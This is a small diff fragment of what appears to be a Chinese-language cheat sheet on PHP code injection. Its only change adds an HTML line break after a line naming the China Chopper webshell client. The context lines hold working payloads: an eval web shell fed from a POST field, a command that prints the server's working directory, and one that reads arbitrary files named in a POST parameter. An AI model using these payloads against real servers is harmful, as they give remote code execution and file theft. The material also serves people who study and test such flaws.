@@ -75,7 +75,7 @@ ${@eval($_POST[1])}
 ```
 ${exit(print(getcwd()))}
 ```
-使用菜刀
+使用菜刀</br>
 （3）读文件
 ```
 ${exit(var_dump(file_get_contents($_POST[f])))}
